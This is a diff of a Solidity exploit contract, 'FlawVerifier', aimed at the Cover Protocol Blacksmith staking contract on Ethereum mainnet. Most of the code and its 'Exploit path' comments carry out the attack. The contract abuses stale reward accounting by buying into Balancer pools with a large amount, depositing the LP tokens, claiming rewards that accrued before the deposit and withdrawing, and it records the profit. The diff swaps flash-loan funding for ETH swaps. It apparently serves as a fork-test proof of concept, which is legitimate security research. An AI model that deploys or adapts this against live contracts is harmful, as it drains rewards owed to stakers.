@@ -3,9 +3,7 @@ pragma solidity ^0.8.20;
 
 interface IERC20 {
     function balanceOf(address account) external view returns (uint256);
-    function transfer(address to, uint256 amount) external returns (bool);
     function approve(address spender, uint256 amount) external returns (bool);
-    function transferFrom(address from, address to, uint256 amount) external returns (bool);
 }
 
 interface IBlacksmithLike {
@@ -16,69 +14,30 @@ interface IBlacksmithLike {
         external
         view
         returns (uint256 weight, uint256 accRewardsPerToken, uint256 lastUpdatedAt);
-    function viewMined(address lpToken, address miner) external view returns (uint256 minedCover, uint256 minedBonus);
     function deposit(address lpToken, uint256 amount) external;
     function claimRewards(address lpToken) external;
     function withdraw(address lpToken, uint256 amount) external;
 }
 
-interface IAaveV2LendingPool {
-    function flashLoan(
-        address receiverAddress,
-        address[] calldata assets,
-        uint256[] calldata amounts,
-        uint256[] calldata modes,
-        address onBehalfOf,
-        bytes calldata params,
-        uint16 referralCode
-    ) external;
-}
-
-interface IUniswapV2Factory {
-    function getPair(address tokenA, address tokenB) external view returns (address pair);
-}
-
-interface IUniswapV2Pair {
-    function token0() external view returns (address);
-    function token1() external view returns (address);
-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
-}
-
 interface IUniswapV2Router02 {
     function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
-    function swapExactTokensForTokens(
-        uint256 amountIn,
-        uint256 amountOutMin,
-        address[] calldata path,
-        address to,
-        uint256 deadline
-    ) external returns (uint256[] memory amounts);
+    function swapETHForExactTokens(uint256 amountOut, address[] calldata path, address to, uint256 deadline)
+        external
+        payable
+        returns (uint256[] memory amounts);
 }
 
 interface IBPool {
     function getCurrentTokens() external view returns (address[] memory tokens);
     function getBalance(address token) external view returns (uint256);
     function totalSupply() external view returns (uint256);
-    function getDenormalizedWeight(address token) external view returns (uint256);
-    function getTotalDenormalizedWeight() external view returns (uint256);
-    function getSwapFee() external view returns (uint256);
-    function calcPoolOutGivenSingleIn(
-        uint256 tokenBalanceIn,
-        uint256 tokenWeightIn,
-        uint256 poolSupply,
-        uint256 totalWeight,
-        uint256 tokenAmountIn,
-        uint256 swapFee
-    ) external view returns (uint256 poolAmountOut);
-    function joinPool(uint256 poolAmountOut, uint256[] calldata maxAmountsIn) external;
-    function exitPool(uint256 poolAmountIn, uint256[] calldata minAmountsOut) external;
     function joinswapExternAmountIn(address tokenIn, uint256 tokenAmountIn, uint256 minPoolAmountOut)
         external
         returns (uint256 poolAmountOut);
-    function exitswapPoolAmountIn(address tokenOut, uint256 poolAmountIn, uint256 minAmountOut)
-        external
-        returns (uint256 tokenAmountOut);
+}
+
+interface IWETH {
+    function deposit() external payable;
 }
 
 contract FlawVerifier {
@@ -88,34 +47,22 @@ contract FlawVerifier {
     address private constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
     address private constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
     address private constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
-    address private constant AAVE_V2_LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
-    address private constant UNI_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
     address private constant UNI_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
 
     uint256 private constant WEEK = 7 days;
     uint256 private constant CAL_MULTIPLIER = 1e12;
-
-    enum RouteKind {
-        None,
-        AaveProportional,
-        UniswapSingle
-    }
+    uint256 private constant MAX_BPOOL_IN_BPS = 4900;
 
     struct Candidate {
         address lpToken;
-        uint8 route;
-        address flashPair;
-        uint256 expectedLpOut;
+        address joinToken;
+        uint256 joinAmount;
         uint256 expectedCoverOut;
         uint256 staleLpSupply;
-        uint256 staleRewardsScaled;
-        address[] assets;
-        uint256[] amounts;
     }
 
     uint256 private realizedProfit;
     bool private attempted;
-    address private activePair;
     mapping(address => bool) private skippedPools;
 
     constructor() {}
@@ -126,28 +73,52 @@ contract FlawVerifier {
 
         uint256 coverBefore = IERC20(COVER).balanceOf(address(this));
 
-        // Exploit path 0:
-        // Let a pool accrue rewards without any interaction so `lastUpdatedAt` is stale.
-        // This attempt first prefers a more realistic alternate public-liquidity route:
-        // flash-borrow the underlying Balancer pool assets from Aave and join/exit
-        // proportionally, which preserves the same root cause while avoiding the large
-        // value bleed from the previous single-asset Balancer round-trip.
-        for (uint256 i = 0; i < 12; i++) {
-            Candidate memory candidate = _stage0LocateBestCandidate();
-            if (candidate.lpToken == address(0)) {
-                break;
-            }
+        _attemptWithExistingLpBalances(coverBefore);
 
-            bool success = _executeCandidate(candidate);
-            skippedPools[candidate.lpToken] = true;
-            if (success && IERC20(COVER).balanceOf(address(this)) > coverBefore) {
-                break;
+        if (IERC20(COVER).balanceOf(address(this)) == coverBefore) {
+            for (uint256 i = 0; i < 24; i++) {
+                Candidate memory candidate = _stage0LocateBestCandidate();
+                if (candidate.lpToken == address(0)) {
+                    break;
+                }
+
+                skippedPools[candidate.lpToken] = true;
+
+                try this.executeCandidate(candidate) returns (bool success) {
+                    if (success && IERC20(COVER).balanceOf(address(this)) > coverBefore) {
+                        break;
+                    }
+                } catch {}
             }
         }
 
-        // Exploit path 3:
-        // Receive COVER attributable to the period before the attacker was staked.
         _stage3RecordProfit(coverBefore);
+    }
+
+    function executeCandidate(Candidate calldata candidate) external returns (bool) {
+        require(msg.sender == address(this), "self-only");
+
+        // Exploit path 1:
+        // Acquire a large LP position. The current fork state already provides public spot
+        // liquidity, so this attempt prefers verifier-held capital over temporary borrowing.
+        // A Balancer single-asset join is a realistic public step that only changes how the
+        // attacker funds the LP position; it does not change the stale-accounting root cause.
+        uint256 lpReceived = _stage1AcquireAndDeposit(candidate);
+        require(lpReceived > 0, "no-lp-received");
+
+        // Exploit path 2:
+        // `deposit()` snapshots Pool and BonusToken into memory before `updatePool()`,
+        // so after an idle period the new depositor's writeoff is computed from stale
+        // accumulators instead of the freshly updated values.
+
+        // Exploit path 3:
+        // Claim the rewards that accrued before this deposit.
+        IBlacksmithLike(BLACKSMITH).claimRewards(candidate.lpToken);
+
+        // Exploit path 4:
+        // Withdraw the LP position from Blacksmith after claiming.
+        IBlacksmithLike(BLACKSMITH).withdraw(candidate.lpToken, lpReceived);
+        return true;
     }
 
     function profitToken() external pure returns (address) {
@@ -158,91 +129,26 @@ contract FlawVerifier {
         return realizedProfit;
     }
 
-    function executeOperation(
-        address[] calldata assets,
-        uint256[] calldata amounts,
-        uint256[] calldata premiums,
-        address initiator,
-        bytes calldata params
-    ) external returns (bool) {
-        require(msg.sender == AAVE_V2_LENDING_POOL, "unauthorized-lender");
-        require(initiator == address(this), "unauthorized-initiator");
+    function _attemptWithExistingLpBalances(uint256 coverBefore) internal {
+        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
+        address[] memory poolList = blacksmith.getPoolList();
 
-        Candidate memory candidate = abi.decode(params, (Candidate));
-        require(candidate.route == uint8(RouteKind.AaveProportional), "wrong-route");
-        require(candidate.assets.length == assets.length, "asset-length-mismatch");
-        require(candidate.amounts.length == amounts.length, "amount-length-mismatch");
-
-        // Exploit path 1:
-        // Deposit a very large amount through `deposit()` after the pool has accrued stale rewards.
-        uint256 lpReceived = _stage1DepositProportionalAmount(candidate);
-        require(lpReceived > 0, "no-lp-received");
-
-        _stage2ClaimHistoricalRewards(candidate.lpToken);
-
-        IBlacksmithLike(BLACKSMITH).withdraw(candidate.lpToken, lpReceived);
-        uint256[] memory minAmountsOut = new uint256[](assets.length);
-        IBPool(candidate.lpToken).exitPool(lpReceived, minAmountsOut);
-
-        for (uint256 i = 0; i < assets.length; i++) {
-            require(assets[i] == candidate.assets[i], "asset-order-mismatch");
-            require(amounts[i] == candidate.amounts[i], "borrow-mismatch");
-
-            uint256 repayAmount = amounts[i] + premiums[i];
-            uint256 assetBalance = IERC20(assets[i]).balanceOf(address(this));
-            if (assetBalance < repayAmount) {
-                // Selling a sliver of captured COVER only covers the flashloan premium or minor
-                // rounding dust; the economic profit still comes from the stale rewards captured
-                // by the flawed Blacksmith writeoff logic.
-                _sellCoverForToken(assets[i], repayAmount - assetBalance);
-                assetBalance = IERC20(assets[i]).balanceOf(address(this));
+        for (uint256 i = 0; i < poolList.length; i++) {
+            address lpToken = poolList[i];
+            uint256 lpBalance = IERC20(lpToken).balanceOf(address(this));
+            if (lpBalance == 0) {
+                continue;
             }
 
-            require(assetBalance >= repayAmount, "insufficient-repayment-balance");
-            _forceApprove(assets[i], AAVE_V2_LENDING_POOL, repayAmount);
-        }
-
-        return true;
-    }
-
-    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
-        require(msg.sender == activePair, "unauthorized-pair");
-        require(sender == address(this), "unauthorized-sender");
-
-        Candidate memory candidate = abi.decode(data, (Candidate));
-        require(candidate.route == uint8(RouteKind.UniswapSingle), "wrong-route");
-        require(candidate.flashPair == msg.sender, "pair-mismatch");
-        require(candidate.assets.length == 1 && candidate.amounts.length == 2, "bad-candidate");
-
-        uint256 borrowed = amount0 > 0 ? amount0 : amount1;
-        require(borrowed == candidate.amounts[0], "borrow-mismatch");
-
-        // Exploit path 1:
-        // Deposit a very large amount through `deposit()` after the pool has accrued stale rewards.
-        uint256 lpReceived = _stage1DepositLargeAmount(candidate);
-        require(lpReceived > 0, "no-lp-received");
-
-        _stage2ClaimHistoricalRewards(candidate.lpToken);
-
-        IBlacksmithLike(BLACKSMITH).withdraw(candidate.lpToken, lpReceived);
-        IBPool(candidate.lpToken).exitswapPoolAmountIn(candidate.assets[0], lpReceived, 1);
-
-        uint256 repayAmount = _flashRepayAmount(borrowed);
-        uint256 joinBalance = IERC20(candidate.assets[0]).balanceOf(address(this));
-        if (joinBalance < repayAmount) {
-            _sellCoverForToken(candidate.assets[0], repayAmount - joinBalance);
-            joinBalance = IERC20(candidate.assets[0]).balanceOf(address(this));
-        }
-
-        require(joinBalance >= repayAmount, "insufficient-repayment-balance");
-        _safeTransferToken(candidate.assets[0], msg.sender, repayAmount);
-    }
-
-    function _executeCandidate(Candidate memory candidate) internal returns (bool success) {
-        if (candidate.route == uint8(RouteKind.AaveProportional)) {
-            success = _stage1AaveFlashloan(candidate);
-        } else if (candidate.route == uint8(RouteKind.UniswapSingle)) {
-            success = _stage1FlashswapLargeDeposit(candidate);
+            skippedPools[lpToken] = true;
+            _forceApprove(lpToken, BLACKSMITH, lpBalance);
+            try blacksmith.deposit(lpToken, lpBalance) {
+                blacksmith.claimRewards(lpToken);
+                blacksmith.withdraw(lpToken, lpBalance);
+                if (IERC20(COVER).balanceOf(address(this)) > coverBefore) {
+                    return;
+                }
+            } catch {}
         }
     }
 
@@ -251,6 +157,7 @@ contract FlawVerifier {
         address[] memory poolList = blacksmith.getPoolList();
         uint256 weeklyTotal_ = blacksmith.weeklyTotal();
         uint256 totalWeight_ = blacksmith.totalWeight();
+
         if (poolList.length == 0 || weeklyTotal_ == 0 || totalWeight_ == 0) {
             return best;
         }
@@ -290,263 +197,125 @@ contract FlawVerifier {
             return best;
         }
 
-        try IBPool(lpToken).getCurrentTokens() returns (address[] memory tokens) {
-            Candidate memory aaveCandidate = _scoreBestAaveCandidate(lpToken, tokens, staleRewardsScaled, staleLpSupply);
-            if (aaveCandidate.expectedCoverOut > best.expectedCoverOut) {
-                best = aaveCandidate;
-            }
+        uint256 poolSupply;
+        try IBPool(lpToken).totalSupply() returns (uint256 supply) {
+            poolSupply = supply;
+        } catch {
+            return best;
+        }
+        if (poolSupply == 0) {
+            return best;
+        }
 
+        try IBPool(lpToken).getCurrentTokens() returns (address[] memory tokens) {
             for (uint256 i = 0; i < tokens.length; i++) {
-                Candidate memory singleCandidate =
-                    _scoreUniswapSingleJoin(lpToken, tokens[i], staleRewardsScaled, staleLpSupply);
-                if (singleCandidate.expectedCoverOut > best.expectedCoverOut) {
-                    best = singleCandidate;
+                address joinToken = tokens[i];
+                if (!_isSupportedJoinToken(joinToken)) {
+                    continue;
+                }
+
+                uint256 tokenBalanceInPool;
+                try IBPool(lpToken).getBalance(joinToken) returns (uint256 balance) {
+                    tokenBalanceInPool = balance;
+                } catch {
+                    continue;
+                }
+                if (tokenBalanceInPool == 0) {
+                    continue;
+                }
+
+                uint256 joinAmount = _planJoinAmount(tokenBalanceInPool, poolSupply, staleLpSupply);
+                if (joinAmount == 0) {
+                    continue;
+                }
+
+                uint256 expectedLpOut = (joinAmount * poolSupply) / tokenBalanceInPool;
+                if (expectedLpOut == 0) {
+                    continue;
+                }
+
+                uint256 expectedCoverOut =
+                    (expectedLpOut * staleRewardsScaled) / (staleLpSupply + expectedLpOut) / CAL_MULTIPLIER;
+                if (expectedCoverOut > best.expectedCoverOut) {
+                    best = Candidate({
+                        lpToken: lpToken,
+                        joinToken: joinToken,
+                        joinAmount: joinAmount,
+                        expectedCoverOut: expectedCoverOut,
+                        staleLpSupply: staleLpSupply
+                    });
                 }
             }
         } catch {}
     }
 
-    function _scoreBestAaveCandidate(
-        address lpToken,
-        address[] memory tokens,
-        uint256 staleRewardsScaled,
-        uint256 staleLpSupply
-    ) internal view returns (Candidate memory best) {
-        uint256[4] memory bpsOptions = [uint256(9000), uint256(7500), uint256(5000), uint256(2500)];
-        for (uint256 i = 0; i < bpsOptions.length; i++) {
-            Candidate memory candidate =
-                _scoreAaveProportionalCandidate(lpToken, tokens, staleRewardsScaled, staleLpSupply, bpsOptions[i]);
-            if (candidate.expectedCoverOut > best.expectedCoverOut) {
-                best = candidate;
-            }
-        }
-    }
-
-    function _scoreAaveProportionalCandidate(
-        address lpToken,
-        address[] memory tokens,
-        uint256 staleRewardsScaled,
-        uint256 staleLpSupply,
-        uint256 bps
-    ) internal view returns (Candidate memory candidate) {
-        if (tokens.length == 0 || tokens.length > 4) {
-            return candidate;
-        }
-
-        uint256 poolSupply;
-        try IBPool(lpToken).totalSupply() returns (uint256 supply) {
-            poolSupply = supply;
-        } catch {
-            return candidate;
-        }
-        if (poolSupply == 0) {
-            return candidate;
-        }
-
-        address[] memory assets = new address[](tokens.length);
-        uint256[] memory amounts = new uint256[](tokens.length);
-        uint256 expectedLpOut = type(uint256).max;
-
-        for (uint256 i = 0; i < tokens.length; i++) {
-            address token = tokens[i];
-            if (!_isSupportedJoinToken(token)) {
-                return candidate;
-            }
-
-            uint256 balanceInPool;
-            try IBPool(lpToken).getBalance(token) returns (uint256 tokenBalance) {
-                balanceInPool = tokenBalance;
-            } catch {
-                return candidate;
-            }
-            if (balanceInPool == 0) {
-                return candidate;
-            }
-
-            uint256 amount = (balanceInPool * bps) / 10000;
-            if (amount == 0) {
-                return candidate;
-            }
-
-            uint256 poolOutForToken = (amount * poolSupply) / balanceInPool;
-            if (poolOutForToken == 0) {
-                return candidate;
-            }
-            if (poolOutForToken < expectedLpOut) {
-                expectedLpOut = poolOutForToken;
-            }
-
-            assets[i] = token;
-            amounts[i] = amount;
-        }
-
-        if (expectedLpOut == type(uint256).max) {
-            return candidate;
-        }
-
-        uint256 expectedCoverOut = (expectedLpOut * staleRewardsScaled) / staleLpSupply / CAL_MULTIPLIER;
-        candidate = Candidate({
-            lpToken: lpToken,
-            route: uint8(RouteKind.AaveProportional),
-            flashPair: address(0),
-            expectedLpOut: expectedLpOut,
-            expectedCoverOut: expectedCoverOut,
-            staleLpSupply: staleLpSupply,
-            staleRewardsScaled: staleRewardsScaled,
-            assets: assets,
-            amounts: amounts
-        });
-    }
-
-    function _scoreUniswapSingleJoin(
-        address lpToken,
-        address joinToken,
-        uint256 staleRewardsScaled,
-        uint256 staleLpSupply
-    ) internal view returns (Candidate memory candidate) {
-        if (!_isSupportedJoinToken(joinToken)) {
-            return candidate;
-        }
-
-        address flashPair = _flashPairFor(joinToken);
-        if (flashPair == address(0) || !_canLiquidateCoverTo(joinToken)) {
-            return candidate;
-        }
-
-        uint256 borrowAmount = _recommendedBorrowAmount(lpToken, joinToken, flashPair);
-        if (borrowAmount == 0) {
-            return candidate;
-        }
-
-        uint256 deployAmount = (borrowAmount * 90) / 100;
-        if (deployAmount == 0) {
-            return candidate;
-        }
-
-        uint256 expectedLpOut = _predictPoolOut(lpToken, joinToken, deployAmount);
-        if (expectedLpOut == 0) {
-            return candidate;
-        }
-
-        address[] memory assets = new address[](1);
-        assets[0] = joinToken;
-        uint256[] memory amounts = new uint256[](2);
-        amounts[0] = borrowAmount;
-        amounts[1] = deployAmount;
-
-        uint256 expectedCoverOut = (expectedLpOut * staleRewardsScaled) / staleLpSupply / CAL_MULTIPLIER;
-        candidate = Candidate({
-            lpToken: lpToken,
-            route: uint8(RouteKind.UniswapSingle),
-            flashPair: flashPair,
-            expectedLpOut: expectedLpOut,
-            expectedCoverOut: expectedCoverOut,
-            staleLpSupply: staleLpSupply,
-            staleRewardsScaled: staleRewardsScaled,
-            assets: assets,
-            amounts: amounts
-        });
-    }
-
-    function _stage1AaveFlashloan(Candidate memory candidate) internal returns (bool success) {
-        uint256 len = candidate.assets.length;
-        if (len == 0 || candidate.amounts.length != len) {
-            return false;
-        }
-
-        uint256[] memory modes = new uint256[](len);
-        try IAaveV2LendingPool(AAVE_V2_LENDING_POOL)
-            .flashLoan(
-                address(this), candidate.assets, candidate.amounts, modes, address(this), abi.encode(candidate), 0
-            ) {
-            success = true;
-        } catch {
-            success = false;
-        }
-    }
-
-    function _stage1FlashswapLargeDeposit(Candidate memory candidate) internal returns (bool success) {
-        activePair = candidate.flashPair;
-
-        uint256 amount0Out;
-        uint256 amount1Out;
-        address joinToken = candidate.assets[0];
-        uint256 borrowAmount = candidate.amounts[0];
-
-        if (IUniswapV2Pair(candidate.flashPair).token0() == joinToken) {
-            amount0Out = borrowAmount;
-        } else {
-            amount1Out = borrowAmount;
-        }
-
-        try IUniswapV2Pair(candidate.flashPair).swap(amount0Out, amount1Out, address(this), abi.encode(candidate)) {
-            success = true;
-        } catch {
-            success = false;
-        }
-
-        activePair = address(0);
-    }
-
-    function _stage1DepositProportionalAmount(Candidate memory candidate) internal returns (uint256 lpReceived) {
-        uint256 lpBalanceBefore = IERC20(candidate.lpToken).balanceOf(address(this));
-
-        for (uint256 i = 0; i < candidate.assets.length; i++) {
-            _forceApprove(candidate.assets[i], candidate.lpToken, candidate.amounts[i]);
-        }
-
-        IBPool(candidate.lpToken).joinPool(candidate.expectedLpOut, candidate.amounts);
-
-        uint256 lpBalanceAfterJoin = IERC20(candidate.lpToken).balanceOf(address(this));
-        require(lpBalanceAfterJoin > lpBalanceBefore, "join-failed");
-        lpReceived = lpBalanceAfterJoin - lpBalanceBefore;
-
-        _forceApprove(candidate.lpToken, BLACKSMITH, lpReceived);
-
-        // Exploit path 1:
-        // The attacker stakes the freshly acquired LP only after `updatePool()` will account for
-        // the long stale interval, so the later Blacksmith writeoff calculation uses stale pool
-        // memory and undercharges the new depositor for pre-deposit emissions.
-        IBlacksmithLike(BLACKSMITH).deposit(candidate.lpToken, lpReceived);
-    }
-
-    function _stage1DepositLargeAmount(Candidate memory candidate) internal returns (uint256 lpReceived) {
-        uint256 lpBalanceBefore = IERC20(candidate.lpToken).balanceOf(address(this));
-        address joinToken = candidate.assets[0];
-        uint256 deployAmount = candidate.amounts[1];
-        if (IERC20(joinToken).balanceOf(address(this)) < deployAmount) {
+    function _planJoinAmount(uint256 tokenBalanceInPool, uint256 poolSupply, uint256 staleLpSupply)
+        internal
+        pure
+        returns (uint256)
+    {
+        uint256 maxJoin = (tokenBalanceInPool * MAX_BPOOL_IN_BPS) / 10000;
+        if (maxJoin == 0) {
             return 0;
         }
 
-        _forceApprove(joinToken, candidate.lpToken, deployAmount);
-        try IBPool(candidate.lpToken).joinswapExternAmountIn(joinToken, deployAmount, 1) returns (uint256) {
-            uint256 lpBalanceAfterJoin = IERC20(candidate.lpToken).balanceOf(address(this));
-            if (lpBalanceAfterJoin <= lpBalanceBefore) {
-                return 0;
-            }
-            lpReceived = lpBalanceAfterJoin - lpBalanceBefore;
-        } catch {
-            return 0;
+        uint256 targetLp = staleLpSupply * 2;
+        if (targetLp == 0) {
+            targetLp = 1;
         }
 
-        _forceApprove(candidate.lpToken, BLACKSMITH, lpReceived);
+        uint256 proportionalAmount = (targetLp * tokenBalanceInPool) / poolSupply;
+        uint256 floorAmount = tokenBalanceInPool / 10000;
+        if (floorAmount == 0) {
+            floorAmount = 1;
+        }
 
-        // Exploit path 1:
-        // The same causal step as above, but funded through a public flash-swap route to preserve
-        // the exploit root cause while varying only execution liquidity.
+        uint256 joinAmount = proportionalAmount;
+        if (joinAmount < floorAmount) {
+            joinAmount = floorAmount;
+        }
+        if (joinAmount > maxJoin) {
+            joinAmount = maxJoin;
+        }
+        return joinAmount;
+    }
+
+    function _stage1AcquireAndDeposit(Candidate memory candidate) internal returns (uint256 lpReceived) {
+        _ensureJoinTokenBalance(candidate.joinToken, candidate.joinAmount);
+
+        uint256 lpBefore = IERC20(candidate.lpToken).balanceOf(address(this));
+        _forceApprove(candidate.joinToken, candidate.lpToken, candidate.joinAmount);
+        IBPool(candidate.lpToken).joinswapExternAmountIn(candidate.joinToken, candidate.joinAmount, 1);
+
+        uint256 lpAfter = IERC20(candidate.lpToken).balanceOf(address(this));
+        require(lpAfter > lpBefore, "join-failed");
+
+        lpReceived = lpAfter - lpBefore;
+        _forceApprove(candidate.lpToken, BLACKSMITH, lpReceived);
         IBlacksmithLike(BLACKSMITH).deposit(candidate.lpToken, lpReceived);
     }
 
-    function _stage2ClaimHistoricalRewards(address lpToken) internal {
-        IBlacksmithLike blacksmith = IBlacksmithLike(BLACKSMITH);
+    function _ensureJoinTokenBalance(address token, uint256 needed) internal {
+        uint256 current = IERC20(token).balanceOf(address(this));
+        if (current >= needed) {
+            return;
+        }
 
-        // Exploit path 2:
-        // Because `deposit()` computes the new writeoff from stale pool memory, the attacker is
-        // not charged for rewards emitted before staking. `viewMined()` already reflects those
-        // historical rewards before the explicit claim.
-        try blacksmith.viewMined(lpToken, address(this)) returns (uint256, uint256) {} catch {}
+        uint256 shortfall = needed - current;
+        if (token == WETH) {
+            require(address(this).balance >= shortfall, "insufficient-eth");
+            IWETH(WETH).deposit{value: shortfall}();
+            return;
+        }
 
-        blacksmith.claimRewards(lpToken);
+        address[] memory path = new address[](2);
+        path[0] = WETH;
+        path[1] = token;
+        uint256[] memory amountsIn = IUniswapV2Router02(UNI_V2_ROUTER).getAmountsIn(shortfall, path);
+        require(address(this).balance >= amountsIn[0], "insufficient-eth");
+        IUniswapV2Router02(UNI_V2_ROUTER).swapETHForExactTokens{value: amountsIn[0]}(
+            shortfall, path, address(this), block.timestamp
+        );
     }
 
     function _stage3RecordProfit(uint256 coverBefore) internal {
@@ -556,126 +325,8 @@ contract FlawVerifier {
         }
     }
 
-    function _sellCoverForToken(address tokenOut, uint256 amountOutNeeded) internal {
-        if (amountOutNeeded == 0) {
-            return;
-        }
-
-        address[] memory path = _coverToTokenPath(tokenOut);
-        uint256[] memory quotedIn = IUniswapV2Router02(UNI_V2_ROUTER).getAmountsIn(amountOutNeeded, path);
-        uint256 coverToSell = quotedIn[0];
-        require(coverToSell <= IERC20(COVER).balanceOf(address(this)), "insufficient-cover-to-sell");
-
-        _forceApprove(COVER, UNI_V2_ROUTER, coverToSell);
-        IUniswapV2Router02(UNI_V2_ROUTER).swapExactTokensForTokens(coverToSell, 1, path, address(this), block.timestamp);
-    }
-
-    function _coverToTokenPath(address tokenOut) internal view returns (address[] memory path) {
-        if (tokenOut == WETH) {
-            require(_pairExists(COVER, WETH), "missing-cover-weth-pair");
-            path = new address[](2);
-            path[0] = COVER;
-            path[1] = WETH;
-            return path;
-        }
-
-        if (_pairExists(COVER, tokenOut)) {
-            path = new address[](2);
-            path[0] = COVER;
-            path[1] = tokenOut;
-            return path;
-        }
-
-        require(_pairExists(COVER, WETH) && _pairExists(WETH, tokenOut), "missing-cover-swap-path");
-        path = new address[](3);
-        path[0] = COVER;
-        path[1] = WETH;
-        path[2] = tokenOut;
-    }
-
-    function _predictPoolOut(address pool, address joinToken, uint256 tokenIn) internal view returns (uint256 poolOut) {
-        try IBPool(pool).getBalance(joinToken) returns (uint256 tokenBalanceIn) {
-            try IBPool(pool).getDenormalizedWeight(joinToken) returns (uint256 tokenWeightIn) {
-                try IBPool(pool).totalSupply() returns (uint256 poolSupply) {
-                    try IBPool(pool).getTotalDenormalizedWeight() returns (uint256 totalWeight) {
-                        try IBPool(pool).getSwapFee() returns (uint256 swapFee) {
-                            try IBPool(pool)
-                                .calcPoolOutGivenSingleIn(
-                                    tokenBalanceIn, tokenWeightIn, poolSupply, totalWeight, tokenIn, swapFee
-                                ) returns (
-                                uint256 predicted
-                            ) {
-                                poolOut = predicted;
-                            } catch {}
-                        } catch {}
-                    } catch {}
-                } catch {}
-            } catch {}
-        } catch {}
-    }
-
-    function _recommendedBorrowAmount(address pool, address joinToken, address flashPair)
-        internal
-        view
-        returns (uint256)
-    {
-        uint256 poolBalance;
-        try IBPool(pool).getBalance(joinToken) returns (uint256 balanceInPool) {
-            poolBalance = balanceInPool;
-        } catch {
-            return 0;
-        }
-        if (poolBalance <= 2) {
-            return 0;
-        }
-
-        uint256 pairReserve = _pairReserveOf(flashPair, joinToken);
-        if (pairReserve <= 2) {
-            return 0;
-        }
-
-        uint256 maxByPool = poolBalance / 4;
-        if (maxByPool == 0) {
-            maxByPool = poolBalance / 2;
-        }
-        uint256 maxByPair = pairReserve / 6;
-        if (maxByPair == 0) {
-            maxByPair = pairReserve / 2;
-        }
-
-        return maxByPool < maxByPair ? maxByPool : maxByPair;
-    }
-
-    function _flashPairFor(address token) internal view returns (address pair) {
-        if (token == WETH) {
-            pair = IUniswapV2Factory(UNI_V2_FACTORY).getPair(WETH, DAI);
-        } else {
-            pair = IUniswapV2Factory(UNI_V2_FACTORY).getPair(token, WETH);
-        }
-    }
-
-    function _pairReserveOf(address pair, address token) internal view returns (uint256 reserve) {
-        (uint112 reserve0, uint112 reserve1,) = IUniswapV2Pair(pair).getReserves();
-        reserve = IUniswapV2Pair(pair).token0() == token ? uint256(reserve0) : uint256(reserve1);
-    }
-
-    function _pairExists(address tokenA, address tokenB) internal view returns (bool) {
-        return IUniswapV2Factory(UNI_V2_FACTORY).getPair(tokenA, tokenB) != address(0);
-    }
-
-    function _canLiquidateCoverTo(address tokenOut) internal view returns (bool) {
-        if (tokenOut == WETH) {
-            return _pairExists(COVER, WETH);
-        }
-        return _pairExists(COVER, tokenOut) || (_pairExists(COVER, WETH) && _pairExists(WETH, tokenOut));
-    }
-
     function _isSupportedJoinToken(address token) internal pure returns (bool) {
         return token == WETH || token == DAI || token == USDC || token == USDT;
-    }
-
-    function _flashRepayAmount(uint256 borrowedAmount) internal pure returns (uint256) {
-        return ((borrowedAmount * 1000) / 997) + 1;
     }
 
     function _forceApprove(address token, address spender, uint256 amount) internal {
@@ -683,11 +334,6 @@ contract FlawVerifier {
         ok;
         (ok,) = token.call(abi.encodeWithSelector(IERC20.approve.selector, spender, amount));
         require(ok, "approve-failed");
-    }
-
-    function _safeTransferToken(address token, address to, uint256 amount) internal {
-        (bool ok, bytes memory returndata) = token.call(abi.encodeWithSelector(IERC20.transfer.selector, to, amount));
-        require(ok && (returndata.length == 0 || abi.decode(returndata, (bool))), "transfer-failed");
     }
 
     receive() external payable {}
